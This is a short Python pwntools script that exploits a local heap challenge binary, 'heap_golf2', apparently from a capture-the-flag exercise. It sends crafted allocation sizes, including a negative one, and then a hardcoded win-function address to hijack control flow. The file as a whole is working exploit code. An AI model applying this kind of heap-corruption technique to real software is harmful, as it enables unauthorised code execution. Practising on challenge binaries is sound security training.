#!/usr/bin/env python2
from pwn import *
from IPython import embed

def main():
    p = process("./heap_golf2")
    winFunc = p64(0x00000000004006f6)

    for i in range(2):
        p.sendline("25")
        p.sendline("AA")

    p.sendline("-2")
    p.sendline("25")
    p.sendline("AA")

    for i in range(12):
        p.send("200")
        p.send("BB")

    print(p.read())

    p.sendline("25")
    p.sendline(winFunc)

    print(p.read())
    p.sendline("-1")

    print(p.read())
#    embed()

if __name__ == "__main__":
    main()
